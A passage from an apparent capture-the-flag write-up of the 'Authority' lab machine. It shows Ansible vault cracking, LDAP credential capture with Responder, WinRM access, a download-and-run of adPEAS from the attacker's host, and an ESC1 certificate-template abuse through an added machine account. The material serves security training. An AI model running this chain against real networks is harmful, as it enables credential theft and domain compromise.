</span></span><span class=line><span class=cl><span class=nx>Hash</span><span class=p>.</span><span class=nx>Target</span><span class=p>......</span><span class=o>:</span> <span class=nx>$ansible$0</span><span class=o>*</span><span class=mi>0</span><span class=o>*</span><span class=mi>2</span><span class=nx>fe48d56e7e16f71c18abd22085f39f4fb11a2</span><span class=p>...</span><span class=nx>bc2cd8</span>
</span></span><span class=line><span class=cl><span class=nx>Time</span><span class=p>.</span><span class=nx>Started</span><span class=p>.....</span><span class=o>:</span> <span class=nx>Wed</span> <span class=nx>Nov</span> <span class=mi>29</span> <span class=mi>09</span><span class=o>:</span><span class=mi>16</span><span class=o>:</span><span class=mi>11</span> <span class=mi>2023</span> <span class=p>(</span><span class=mi>18</span> <span class=nx>secs</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nx>Time</span><span class=p>.</span><span class=nx>Estimated</span><span class=p>...</span><span class=o>:</span> <span class=nx>Wed</span> <span class=nx>Nov</span> <span class=mi>29</span> <span class=mi>09</span><span class=o>:</span><span class=mi>16</span><span class=o>:</span><span class=mi>29</span> <span class=mi>2023</span> <span class=p>(</span><span class=mi>0</span> <span class=nx>secs</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nx>Guess</span><span class=p>.</span><span class=nx>Base</span><span class=p>.......</span><span class=o>:</span> <span class=nx>File</span> <span class=p>(</span><span class=err>/usr/share/wordlists/rockyou.txt)</span>
</span></span><span class=line><span class=cl><span class=nx>Guess</span><span class=p>.</span><span class=nx>Queue</span><span class=p>......</span><span class=o>:</span> <span class=mi>1</span><span class=o>/</span><span class=mi>1</span> <span class=p>(</span><span class=mf>100.00</span><span class=o>%</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nx>Speed</span><span class=p>.</span><span class=err>#</span><span class=mf>1.</span><span class=p>........</span><span class=o>:</span>     <span class=mi>2228</span> <span class=nx>H</span><span class=o>/</span><span class=nx>s</span> <span class=p>(</span><span class=mf>6.31</span><span class=nx>ms</span><span class=p>)</span> <span class=err>@</span> <span class=nx>Accel</span><span class=o>:</span><span class=mi>512</span> <span class=nx>Loops</span><span class=o>:</span><span class=mi>128</span> <span class=nx>Thr</span><span class=o>:</span><span class=mi>1</span> <span class=nx>Vec</span><span class=o>:</span><span class=mi>8</span>
</span></span><span class=line><span class=cl><span class=nx>Recovered</span><span class=p>........</span><span class=o>:</span> <span class=mi>1</span><span class=o>/</span><span class=mi>1</span> <span class=p>(</span><span class=mf>100.00</span><span class=o>%</span><span class=p>)</span> <span class=nx>Digests</span>
</span></span><span class=line><span class=cl><span class=nx>Progress</span><span class=p>.........</span><span class=o>:</span> <span class=mi>39936</span><span class=o>/</span><span class=mi>14344385</span> <span class=p>(</span><span class=mf>0.28</span><span class=o>%</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nx>Rejected</span><span class=p>.........</span><span class=o>:</span> <span class=mi>0</span><span class=o>/</span><span class=mi>39936</span> <span class=p>(</span><span class=mf>0.00</span><span class=o>%</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nx>Restore</span><span class=p>.</span><span class=nx>Point</span><span class=p>....</span><span class=o>:</span> <span class=mi>38400</span><span class=o>/</span><span class=mi>14344385</span> <span class=p>(</span><span class=mf>0.27</span><span class=o>%</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nx>Restore</span><span class=p>.</span><span class=nx>Sub</span><span class=p>.</span><span class=err>#</span><span class=mf>1.</span><span class=p>..</span><span class=o>:</span> <span class=nx>Salt</span><span class=o>:</span><span class=mi>0</span> <span class=nx>Amplifier</span><span class=o>:</span><span class=mi>0</span><span class=o>-</span><span class=mi>1</span> <span class=nx>Iteration</span><span class=o>:</span><span class=mi>9984</span><span class=o>-</span><span class=mi>9999</span>
</span></span><span class=line><span class=cl><span class=nx>Candidates</span><span class=p>.</span><span class=err>#</span><span class=mf>1.</span><span class=p>...</span><span class=o>:</span> <span class=nx>jonah1</span> <span class=o>-&gt;</span> <span class=nx>prospect</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>Started</span><span class=o>:</span> <span class=nx>Wed</span> <span class=nx>Nov</span> <span class=mi>29</span> <span class=mi>09</span><span class=o>:</span><span class=mi>15</span><span class=o>:</span><span class=mi>24</span> <span class=mi>2023</span>
</span></span><span class=line><span class=cl><span class=nx>Stopped</span><span class=o>:</span> <span class=nx>Wed</span> <span class=nx>Nov</span> <span class=mi>29</span> <span class=mi>09</span><span class=o>:</span><span class=mi>16</span><span class=o>:</span><span class=mi>33</span> <span class=mi>2023</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>noob@parrot<span class=o>]</span>─<span class=o>[</span>~/htb/authority/notes/smb_development<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ $/usr/share/john/ansible2john.py pwm_admin_password <span class=p>|</span> awk -F <span class=s1>&#39;:&#39;</span> <span class=s1>&#39;{print $2}&#39;</span>
</span></span><span class=line><span class=cl><span class=nv>$ansible$0</span>*0*15c849c20c74562a25c925c3e5a4abafd392c77635abc2ddc827ba0a1037e9d5*1dff07007e7a25e438e94de3f3e605e1*66cb125164f19fb8ed22809393b1767055a66deae678f4a8b1f8550905f70da5
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>noob@parrot<span class=o>]</span>─<span class=o>[</span>~/htb/authority/notes/smb_development<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ $/usr/share/john/ansible2john.py pwm_admin_password <span class=p>|</span> awk -F <span class=s1>&#39;:&#39;</span> <span class=s1>&#39;{print $2}&#39;</span> &gt; pwm_admin_password_hash
</span></span></code></pre></div><p>Upon inspecting all three vaults, it was observed that each one shared the same vault password. The next step involved decrypting the vault to access and read the sensitive information within.</p><p>As per the instructions we get three different secrets i.e. ldap_admin_password, pwm_admin_password, and pwm_admin_login.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>noob@parrot<span class=o>]</span>─<span class=o>[</span>~/htb/authority/notes/smb_development<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=nv>$cat</span> ldap_admin_password <span class=p>|</span> ansible-vault decrypt
</span></span><span class=line><span class=cl>Vault password: 
</span></span><span class=line><span class=cl>Decryption successful
</span></span><span class=line><span class=cl>DevT3st@123┌─<span class=o>[</span>noob@parrot<span class=o>]</span>─<span class=o>[</span>~/htb/authority/notes/smb_development<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=nv>$cat</span> pwm_admin_password <span class=p>|</span> ansible-vault decrypt
</span></span><span class=line><span class=cl>Vault password: 
</span></span><span class=line><span class=cl>Decryption successful
</span></span><span class=line><span class=cl>pWm_@dm!N_!23┌─<span class=o>[</span>noob@parrot<span class=o>]</span>─<span class=o>[</span>~/htb/authority/notes/smb_development<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=nv>$cat</span> pwm_admin_login <span class=p>|</span> ansible-vault decrypt
</span></span><span class=line><span class=cl>Vault password: 
</span></span><span class=line><span class=cl>Decryption successful
</span></span><span class=line><span class=cl>svc_pwm
</span></span></code></pre></div><p>I kept a note of the three for further enumeration.</p><h2 id=iis-default-page-at-tcp-80>IIS default page at TCP 80<a hidden class=anchor aria-hidden=true href=#iis-default-page-at-tcp-80>#</a></h2><p><img alt=Untitled loading=lazy src=/posts/authority/Authority%20a3042a30632b45c180804fb6597f026a/Untitled%201.png></p><p>Port 80 didn&rsquo;t have much info and directory enumeration with fuff didn&rsquo;t give much either. So we can move on to other ports.</p><h2 id=pwm-at-port-8443>PWM at Port 8443<a hidden class=anchor aria-hidden=true href=#pwm-at-port-8443>#</a></h2><p>PWM is an open-source <code>password self-service application</code> for LDAP directories. It has a web-based configuration manager running on port 8443. Just visiting the website greeted us with a message that PWM was currently running in <code>configuration mode</code>.</p><p><img alt=Untitled loading=lazy src=/posts/authority/Authority%20a3042a30632b45c180804fb6597f026a/Untitled%202.png></p><p><img alt=Untitled loading=lazy src=/posts/authority/Authority%20a3042a30632b45c180804fb6597f026a/Untitled%203.png></p><p>We can use the credentials extracted from the Ansible vault to log in to the config editor.</p><p>The username was <code>svc_pwm</code> and the password was <code>pWm_@dm!N_!23</code>. We were able to log in to the web portal and it had different configuration options we could play with. One of them that piqued my interest was <code>LDAP</code> settings and apparently, we could test that particular setting. This could be used to coerce authentication to the attacker&rsquo;s server and leak credentials.</p><p><img alt=Untitled loading=lazy src=/posts/authority/Authority%20a3042a30632b45c180804fb6597f026a/Untitled%204.png></p><p>We were able to successfully coerce authentication to our server and gather sensitive information and in this case clear-text credentials.</p><p><img alt=Untitled loading=lazy src=/posts/authority/Authority%20a3042a30632b45c180804fb6597f026a/Untitled%205.png></p><p>Since I had tried this multiple times, the clear text credentials could be found in the logs of <code>responder</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-jsx data-lang=jsx><span class=line><span class=cl><span class=err>┌─</span><span class=p>[</span><span class=nx>noob</span><span class=err>@</span><span class=nx>parrot</span><span class=p>]</span><span class=err>─</span><span class=p>[</span><span class=o>~</span><span class=err>/htb/authority/notes/smb_development]</span>
</span></span><span class=line><span class=cl><span class=err>└──╼</span> <span class=nx>$cat</span> <span class=o>/</span><span class=nx>usr</span><span class=o>/</span><span class=nx>share</span><span class=o>/</span><span class=nx>responder</span><span class=o>/</span><span class=nx>logs</span><span class=o>/</span><span class=nx>LDAP</span><span class=o>-</span><span class=nx>Cleartext</span><span class=o>-</span><span class=nx>ClearText</span><span class=o>-</span><span class=mf>10.10.11.222</span><span class=p>.</span><span class=nx>txt</span> 
</span></span><span class=line><span class=cl><span class=nx>b</span><span class=s1>&#39;CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htb&#39;</span><span class=o>:</span><span class=nx>b</span><span class=s1>&#39;lDaP_1n_th3_cle4r!&#39;</span>
</span></span><span class=line><span class=cl><span class=nx>b</span><span class=s1>&#39;CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htb&#39;</span><span class=o>:</span><span class=nx>b</span><span class=s1>&#39;lDaP_1n_th3_cle4r!&#39;</span>
</span></span></code></pre></div><p>Since I have credentials for <code>svc_ldap</code> account, I tried to enumerate LDAP information from <code>ldapsearch</code> but couldn’t. My understanding here was that LDAP was configured to work only in <code>LDAPS</code> and that I couldn&rsquo;t get to work so I moved on to <code>crackmapexec</code> for this.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-jsx data-lang=jsx><span class=line><span class=cl><span class=err>┌─</span><span class=p>[</span><span class=nx>noob</span><span class=err>@</span><span class=nx>parrot</span><span class=p>]</span><span class=err>─</span><span class=p>[</span><span class=o>~</span><span class=err>/htb/authority/notes/smb_development]</span>
</span></span><span class=line><span class=cl><span class=err>└──╼</span> <span class=nx>$ldapsearch</span> <span class=o>-</span><span class=nx>x</span> <span class=o>-</span><span class=nx>H</span> <span class=nx>ldap</span><span class=o>:</span><span class=c1>//10.10.11.222 -D &#39;authority\svc_ldap&#39; -w &#39;lDaP_1n_th3_cle4r!&#39; -b &#39;DC=authority,DC=htb&#39; &#39;(objectClass=user)&#39;
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nx>ldap_bind</span><span class=o>:</span> <span class=nx>Invalid</span> <span class=nx>credentials</span> <span class=p>(</span><span class=mi>49</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=nx>additional</span> <span class=nx>info</span><span class=o>:</span> <span class=mi>80090308</span><span class=o>:</span> <span class=nx>LdapErr</span><span class=o>:</span> <span class=nx>DSID</span><span class=o>-</span><span class=mi>0</span><span class=nx>C090439</span><span class=p>,</span> <span class=nx>comment</span><span class=o>:</span> <span class=nx>AcceptSecurityContext</span> <span class=nx>error</span><span class=p>,</span> <span class=nx>data</span> <span class=mi>52</span><span class=nx>e</span><span class=p>,</span> <span class=nx>v4563</span>
</span></span></code></pre></div><p>Confirmed that the credentials for <code>svc_ldap</code> were correct and also that this user had <code>WINRM</code> access over the domain.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>root@a5c35e0df3f9:/usr/src/crackmapexec# cme winrm 10.10.11.222 -u <span class=s1>&#39;svc_ldap&#39;</span> -p <span class=s1>&#39;lDaP_1n_th3_cle4r!&#39;</span>
</span></span><span class=line><span class=cl>SMB         10.10.11.222    <span class=m>5985</span>   AUTHORITY        <span class=o>[</span>*<span class=o>]</span> Windows 10.0 Build <span class=m>17763</span> <span class=o>(</span>name:AUTHORITY<span class=o>)</span> <span class=o>(</span>domain:authority.htb<span class=o>)</span>
</span></span><span class=line><span class=cl>HTTP        10.10.11.222    <span class=m>5985</span>   AUTHORITY        <span class=o>[</span>*<span class=o>]</span> http://10.10.11.222:5985/wsman
</span></span><span class=line><span class=cl>HTTP        10.10.11.222    <span class=m>5985</span>   AUTHORITY        <span class=o>[</span>+<span class=o>]</span> authority.htb<span class=se>\s</span>vc_ldap:lDaP_1n_th3_cle4r! <span class=o>(</span>Pwn3d!<span class=o>)</span>
</span></span></code></pre></div><h2 id=post-credential-enumeration>Post Credential Enumeration<a hidden class=anchor aria-hidden=true href=#post-credential-enumeration>#</a></h2><p>After logging into the machine, I checked the user&rsquo;s privileges and if it was a member of any vulnerable group.</p><p>Since there were few users, I tried enumerating initially with Winpeas and then moved on to Adpeas which showed some suspicious server certificates.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>*Evil-WinRM* PS C:<span class=se>\w</span>indows<span class=se>\t</span>asks&gt; iex<span class=o>(</span>iwr 10.10.14.112:8000/adPEAS.ps1 -UseBasicParsing<span class=o>)</span>
</span></span></code></pre></div><p>It can be seen that the template “CorpVPN” has <code>ENROLLEE_SUPPLIES_SUBJECT</code> flag as true and Domain Computer has enrolment rights for this template.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>[</span>?<span class=o>]</span> +++++ Checking Template <span class=s1>&#39;CorpVPN&#39;</span> +++++
</span></span><span class=line><span class=cl><span class=o>[</span>!<span class=o>]</span> Template <span class=s1>&#39;CorpVPN&#39;</span> has Flag <span class=s1>&#39;ENROLLEE_SUPPLIES_SUBJECT&#39;</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Identity <span class=s1>&#39;HTB\Domain Computers&#39;</span> has enrollment rights <span class=k>for</span> template <span class=s1>&#39;CorpVPN&#39;</span>
</span></span><span class=line><span class=cl>Template Name:				CorpVPN
</span></span><span class=line><span class=cl>Template distinguishedname:		<span class=nv>CN</span><span class=o>=</span>CorpVPN,CN<span class=o>=</span>Certificate Templates,CN<span class=o>=</span>Public Key Services,CN<span class=o>=</span>Services,CN<span class=o>=</span>Configuration,DC<span class=o>=</span>authority,DC<span class=o>=</span>htb
</span></span><span class=line><span class=cl>Date of Creation:			03/24/2023 23:48:09
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Extended Key Usage:			Encrypting File System, Secure E-mail, Client Authentication, Document Signing, 1.3.6.1.5.5.8.2.2, IP Security User, KDC Authentication
</span></span><span class=line><span class=cl>EnrollmentFlag:				INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT_CHECK_USER_DS_CERTIFICATE
</span></span><span class=line><span class=cl><span class=o>[</span>!<span class=o>]</span> CertificateNameFlag:		ENROLLEE_SUPPLIES_SUBJECT
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Enrollment allowed <span class=k>for</span>:		HTB<span class=se>\D</span>omain Computers
</span></span></code></pre></div><p>This vulnerability could be easily confirmed with <code>certipy</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>(</span>venv<span class=o>)</span> ┌─<span class=o>[</span>✗<span class=o>]</span>─<span class=o>[</span>noob@parrot<span class=o>]</span>─<span class=o>[</span>~/htb/authority/notes/certs<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=nv>$certipy</span> find -u svc_ldap -p <span class=s1>&#39;lDaP_1n_th3_cle4r!&#39;</span> -dc-ip 10.10.11.222 -vulnerable -stdout
</span></span><span class=line><span class=cl>Certipy v4.8.2 - by Oliver Lyak <span class=o>(</span>ly4k<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Finding certificate templates
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Found <span class=m>37</span> certificate templates
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Finding certificate authorities
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Found <span class=m>1</span> certificate authority
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Found <span class=m>13</span> enabled certificate templates
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Trying to get CA configuration <span class=k>for</span> <span class=s1>&#39;AUTHORITY-CA&#39;</span> via CSRA
</span></span><span class=line><span class=cl><span class=o>[</span>!<span class=o>]</span> Got error <span class=k>while</span> trying to get CA configuration <span class=k>for</span> <span class=s1>&#39;AUTHORITY-CA&#39;</span> via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Trying to get CA configuration <span class=k>for</span> <span class=s1>&#39;AUTHORITY-CA&#39;</span> via RRP
</span></span><span class=line><span class=cl><span class=o>[</span>!<span class=o>]</span> Failed to connect to remote registry. Service should be starting now. Trying again...
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Got CA configuration <span class=k>for</span> <span class=s1>&#39;AUTHORITY-CA&#39;</span>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Enumeration output:
</span></span><span class=line><span class=cl>Certificate Authorities
</span></span><span class=line><span class=cl>  <span class=m>0</span>
</span></span><span class=line><span class=cl>    CA Name                             : AUTHORITY-CA
</span></span><span class=line><span class=cl>    DNS Name                            : authority.authority.htb
</span></span><span class=line><span class=cl>    Certificate Subject                 : <span class=nv>CN</span><span class=o>=</span>AUTHORITY-CA, <span class=nv>DC</span><span class=o>=</span>authority, <span class=nv>DC</span><span class=o>=</span>htb
</span></span><span class=line><span class=cl>    Certificate Serial Number           : 2C4E1F3CA46BBDAF42A1DDE3EC33A6B4
</span></span><span class=line><span class=cl>    Certificate Validity Start          : 2023-04-24 01:46:26+00:00
</span></span><span class=line><span class=cl>    Certificate Validity End            : 2123-04-24 01:56:25+00:00
</span></span><span class=line><span class=cl>    Web Enrollment                      : Disabled
</span></span><span class=line><span class=cl>    User Specified SAN                  : Disabled
</span></span><span class=line><span class=cl>    Request Disposition                 : Issue
</span></span><span class=line><span class=cl>    Enforce Encryption <span class=k>for</span> Requests     : Enabled
</span></span><span class=line><span class=cl>    Permissions
</span></span><span class=line><span class=cl>      Owner                             : AUTHORITY.HTB<span class=se>\A</span>dministrators
</span></span><span class=line><span class=cl>      Access Rights
</span></span><span class=line><span class=cl>        ManageCertificates              : AUTHORITY.HTB<span class=se>\A</span>dministrators
</span></span><span class=line><span class=cl>                                          AUTHORITY.HTB<span class=se>\D</span>omain Admins
</span></span><span class=line><span class=cl>                                          AUTHORITY.HTB<span class=se>\E</span>nterprise Admins
</span></span><span class=line><span class=cl>        ManageCa                        : AUTHORITY.HTB<span class=se>\A</span>dministrators
</span></span><span class=line><span class=cl>                                          AUTHORITY.HTB<span class=se>\D</span>omain Admins
</span></span><span class=line><span class=cl>                                          AUTHORITY.HTB<span class=se>\E</span>nterprise Admins
</span></span><span class=line><span class=cl>        Enroll                          : AUTHORITY.HTB<span class=se>\A</span>uthenticated Users
</span></span><span class=line><span class=cl>Certificate Templates
</span></span><span class=line><span class=cl>  <span class=m>0</span>
</span></span><span class=line><span class=cl>    Template Name                       : CorpVPN
</span></span><span class=line><span class=cl>    Display Name                        : Corp VPN
</span></span><span class=line><span class=cl>    Certificate Authorities             : AUTHORITY-CA
</span></span><span class=line><span class=cl>    Enabled                             : True
</span></span><span class=line><span class=cl>    Client Authentication               : True
</span></span><span class=line><span class=cl>    Enrollment Agent                    : False
</span></span><span class=line><span class=cl>    Any Purpose                         : False
</span></span><span class=line><span class=cl>    Enrollee Supplies Subject           : True
</span></span><span class=line><span class=cl>    Certificate Name Flag               : EnrolleeSuppliesSubject
</span></span><span class=line><span class=cl>    Enrollment Flag                     : AutoEnrollmentCheckUserDsCertificate
</span></span><span class=line><span class=cl>                                          PublishToDs
</span></span><span class=line><span class=cl>                                          IncludeSymmetricAlgorithms
</span></span><span class=line><span class=cl>    Private Key Flag                    : <span class=m>16777216</span>
</span></span><span class=line><span class=cl>                                          <span class=m>65536</span>
</span></span><span class=line><span class=cl>                                          ExportableKey
</span></span><span class=line><span class=cl>    Extended Key Usage                  : Encrypting File System
</span></span><span class=line><span class=cl>                                          Secure Email
</span></span><span class=line><span class=cl>                                          Client Authentication
</span></span><span class=line><span class=cl>                                          Document Signing
</span></span><span class=line><span class=cl>                                          IP security IKE intermediate
</span></span><span class=line><span class=cl>                                          IP security use
</span></span><span class=line><span class=cl>                                          KDC Authentication
</span></span><span class=line><span class=cl>    Requires Manager Approval           : False
</span></span><span class=line><span class=cl>    Requires Key Archival               : False
</span></span><span class=line><span class=cl>    Authorized Signatures Required      : <span class=m>0</span>
</span></span><span class=line><span class=cl>    Validity Period                     : <span class=m>20</span> years
</span></span><span class=line><span class=cl>    Renewal Period                      : <span class=m>6</span> weeks
</span></span><span class=line><span class=cl>    Minimum RSA Key Length              : <span class=m>2048</span>
</span></span><span class=line><span class=cl>    Permissions
</span></span><span class=line><span class=cl>      Enrollment Permissions
</span></span><span class=line><span class=cl>        Enrollment Rights               : AUTHORITY.HTB<span class=se>\D</span>omain Computers
</span></span><span class=line><span class=cl>                                          AUTHORITY.HTB<span class=se>\D</span>omain Admins
</span></span><span class=line><span class=cl>                                          AUTHORITY.HTB<span class=se>\E</span>nterprise Admins
</span></span><span class=line><span class=cl>      Object Control Permissions
</span></span><span class=line><span class=cl>        Owner                           : AUTHORITY.HTB<span class=se>\A</span>dministrator
</span></span><span class=line><span class=cl>        Write Owner Principals          : AUTHORITY.HTB<span class=se>\D</span>omain Admins
</span></span><span class=line><span class=cl>                                          AUTHORITY.HTB<span class=se>\E</span>nterprise Admins
</span></span><span class=line><span class=cl>                                          AUTHORITY.HTB<span class=se>\A</span>dministrator
</span></span><span class=line><span class=cl>        Write Dacl Principals           : AUTHORITY.HTB<span class=se>\D</span>omain Admins
</span></span><span class=line><span class=cl>                                          AUTHORITY.HTB<span class=se>\E</span>nterprise Admins
</span></span><span class=line><span class=cl>                                          AUTHORITY.HTB<span class=se>\A</span>dministrator
</span></span><span class=line><span class=cl>        Write Property Principals       : AUTHORITY.HTB<span class=se>\D</span>omain Admins
</span></span><span class=line><span class=cl>                                          AUTHORITY.HTB<span class=se>\E</span>nterprise Admins
</span></span><span class=line><span class=cl>                                          AUTHORITY.HTB<span class=se>\A</span>dministrator
</span></span><span class=line><span class=cl>    <span class=o>[</span>!<span class=o>]</span> Vulnerabilities
</span></span><span class=line><span class=cl>      ESC1                              : <span class=s1>&#39;AUTHORITY.HTB\\Domain Computers&#39;</span> can enroll, enrollee supplies subject and template allows client authentication
</span></span></code></pre></div><h3 id=adcs-active-directory-certificate-services>ADCS (Active Directory Certificate Services)<a hidden class=anchor aria-hidden=true href=#adcs-active-directory-certificate-services>#</a></h3><p>AD CS is a server role that functions as <code>Microsoft’s public key infrastructure PKI implementation</code>. As expected, it integrates tightly with Active Directory. It enables the <code>issuing of certificates</code>, which are X.509-formatted digitally signed electronic documents that can be used for encryption, message signing, and/or <code>authentication</code> (our research focus). One important thing to note for ADCS is that certificates are independent authentication material and will be valid even if the user (or computer) resets the password.</p><p>[source: <a href=https://posts.specterops.io/certified-pre-owned-d95910965cd2>https://posts.specterops.io/certified-pre-owned-d95910965cd2</a> ]</p><p>We can check the requirements for <code>ESC1</code> ➖</p><ul><li>Enterprise CA grants Domain Computers enrolment rights.</li><li>Manager approval is disabled.</li><li>No authorization signatures are required</li><li>Certificate template security descriptor grants certificate enrolment rights to Domain Computers</li><li>Certificate templates define EKU that enable authentication. (Here we have Client Authentication)</li><li>The certificate template allows the requester to specify subjectAltName (SAN) in the certificate signing request. (Enrollee supplies subject is set to True)</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-jsx data-lang=jsx><span class=line><span class=cl><span class=o>*</span><span class=nx>Evil</span><span class=o>-</span><span class=nx>WinRM</span><span class=o>*</span> <span class=nx>PS</span> <span class=nx>C</span><span class=o>:</span><span class=err>\</span><span class=nx>Users</span><span class=err>\</span><span class=nx>svc_ldap</span><span class=err>\</span><span class=nx>Documents</span><span class=o>&gt;</span> <span class=nx>whoami</span> <span class=o>/</span><span class=nx>priv</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>PRIVILEGES</span> <span class=nx>INFORMATION</span>
</span></span><span class=line><span class=cl><span class=o>----------------------</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>Privilege</span> <span class=nx>Name</span>                <span class=nx>Description</span>                    <span class=nx>State</span>
</span></span><span class=line><span class=cl><span class=o>=============================</span> <span class=o>==============================</span> <span class=o>=======</span>
</span></span><span class=line><span class=cl><span class=nx>SeMachineAccountPrivilege</span>     <span class=nx>Add</span> <span class=nx>workstations</span> <span class=nx>to</span> <span class=nx>domain</span>     <span class=nx>Enabled</span>
</span></span><span class=line><span class=cl><span class=nx>SeChangeNotifyPrivilege</span>       <span class=nx>Bypass</span> <span class=nx>traverse</span> <span class=nx>checking</span>       <span class=nx>Enabled</span>
</span></span><span class=line><span class=cl><span class=nx>SeIncreaseWorkingSetPrivilege</span> <span class=nx>Increase</span> <span class=nx>a</span> <span class=nx>process</span> <span class=nx>working</span> <span class=nx>set</span> <span class=nx>Enabled</span>
</span></span></code></pre></div><p>The account <code>svc_ldap</code> has the privilege of adding a computer to the domain. The script <code>addcomputer.py</code> can be used to add a computer to the domain.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-jsx data-lang=jsx><span class=line><span class=cl><span class=err>┌─</span><span class=p>[</span><span class=err>✗</span><span class=p>]</span><span class=err>─</span><span class=p>[</span><span class=nx>noob</span><span class=err>@</span><span class=nx>parrot</span><span class=p>]</span><span class=err>─</span><span class=p>[</span><span class=o>~</span><span class=err>/htb/authority/notes/certs]</span>
</span></span><span class=line><span class=cl><span class=err>└──╼</span> <span class=nx>$addcomputer</span><span class=p>.</span><span class=nx>py</span> <span class=o>-</span><span class=nx>computer</span><span class=o>-</span><span class=nx>name</span> <span class=s1>&#39;NOOB$&#39;</span> <span class=o>-</span><span class=nx>computer</span><span class=o>-</span><span class=nx>pass</span> <span class=s1>&#39;n00brival&#39;</span> <span class=o>-</span><span class=nx>dc</span><span class=o>-</span><span class=nx>ip</span> <span class=mf>10.10.11.222</span> <span class=s1>&#39;authority.htb/svc_ldap:lDaP_1n_th3_cle4r!&#39;</span>
</span></span><span class=line><span class=cl><span class=nx>Impacket</span> <span class=nx>v0</span><span class=mf>.10.1</span><span class=p>.</span><span class=nx>dev1</span><span class=o>+</span><span class=mf>20230504.43204.0</span><span class=nx>bdad34a</span> <span class=o>-</span> <span class=nx>Copyright</span> <span class=mi>2022</span> <span class=nx>Fortra</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>Successfully</span> <span class=nx>added</span> <span class=nx>machine</span> <span class=nx>account</span> <span class=nx>NOOB$</span> <span class=kd>with</span> <span class=nx>password</span> <span class=nx>n00brival</span><span class=p>.</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-jsx data-lang=jsx><span class=line><span class=cl><span class=p>(</span><span class=nx>venv</span><span class=p>)</span> <span class=err>┌─</span><span class=p>[</span><span class=nx>noob</span><span class=err>@</span><span class=nx>parrot</span><span class=p>]</span><span class=err>─</span><span class=p>[</span><span class=o>~</span><span class=err>/htb/authority/notes/certs]</span>
</span></span><span class=line><span class=cl><span class=err>└──╼</span> <span class=nx>$certipy</span> <span class=nx>req</span> <span class=o>-</span><span class=nx>u</span> <span class=s1>&#39;NOOB$@authority.htb&#39;</span> <span class=o>-</span><span class=nx>p</span> <span class=s1>&#39;n00brival&#39;</span> <span class=o>-</span><span class=nx>ca</span> <span class=nx>AUTHORITY</span><span class=o>-</span><span class=nx>CA</span> <span class=o>-</span><span class=nx>target</span> <span class=nx>authority</span><span class=p>.</span><span class=nx>authority</span><span class=p>.</span><span class=nx>htb</span> <span class=o>-</span><span class=nx>template</span> <span class=nx>CorpVPN</span> <span class=o>-</span><span class=nx>upn</span> <span class=nx>administrator</span><span class=err>@</span><span class=nx>authority</span><span class=p>.</span><span class=nx>htb</span>  <span class=o>-</span><span class=nx>debug</span>
</span></span><span class=line><span class=cl><span class=nx>Certipy</span> <span class=nx>v4</span><span class=mf>.8.2</span> <span class=o>-</span> <span class=nx>by</span> <span class=nx>Oliver</span> <span class=nx>Lyak</span> <span class=p>(</span><span class=nx>ly4k</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=nx>Trying</span> <span class=nx>to</span> <span class=nx>resolve</span> <span class=s1>&#39;authority.authority.htb&#39;</span> <span class=nx>at</span> <span class=s1>&#39;10.0.2.3&#39;</span>
